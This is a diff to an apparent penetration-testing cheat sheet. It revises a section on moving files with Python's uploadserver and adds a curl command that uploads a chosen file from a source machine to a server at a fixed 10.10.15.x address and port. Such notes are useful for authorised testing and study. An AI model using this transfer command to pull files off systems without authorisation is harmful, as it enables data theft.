@@ -449,16 +449,20 @@ scp user@remote_ip:/remote/path/<FILE> /local/path/
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h4>Python UploadServer (Basic)</h4></summary>
 
-**Source Machine: Start Web Server**  
+**Detination Machine: Start Web Server**
+
+Run in the target directory
+
 ```bash
-# Run in the target directory
 sudo python3 -m pip install --user uploadserver
 sudo python3 -m uploadserver <PORT>
-
-#Serving HTTP on 0.0.0.0 port <PORT> (http://0.0.0.0:<PORT>/) ...
 ```  
-  
-> **_Destination Machine:_**  Refer to the "Downloads" section for available transfer methods.
+
+**Source Machine: Upload the file**
+
+```bash
+curl -F "files=@<FILE>" http://10.10.15.60:4444/upload
+```
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
